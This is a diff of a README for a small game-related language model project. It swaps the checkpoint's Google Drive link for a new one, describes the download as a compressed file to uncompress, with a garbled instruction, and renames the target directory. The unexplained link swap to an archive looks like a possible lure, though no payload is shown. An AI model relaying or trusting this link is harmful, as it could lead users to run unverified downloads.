@@ -62,10 +62,10 @@ These are project research directions; individual capabilities depend on the cur
 
 The recommended model checkpoint is available through Google Drive.
 
-New users: download this checkpoint before attempting to load the pretrained model.
+New users: download this compared file and uncompressed it before attempting to load the pretrained model.
 
 <p align="center">
-  <a href="https://drive.google.com/file/d/17eCBQaZb2l6gKu96WhQVY2zHGCnWkzvY/view?usp=drivesdk">
+  <a href="https://drive.google.com/file/d/1kJ6QNzKhUYTfsyOUfZWNdJ8sAJfM1CY-/view?usp=drivesdk">
     <img src="https://img.shields.io/badge/⬇%20CLICK%20HERE%20TO%20DOWNLOAD%20THE%20MODEL-GOOGLE%20DRIVE-4285F4?style=for-the-badge&logo=googledrive&logoColor=white" />
   </a>
 </p>📦 Checkpoint installation
@@ -79,9 +79,9 @@ cd gamers_llm
 
 Step 2 — Create the checkpoint directory
 
-mkdir -p checkpoints/10m
+mkdir -p gamellm
 
-Step 3 — Download the checkpoint
+Step 3 — Download the compressed file
 
 Open the Google Drive link:
 
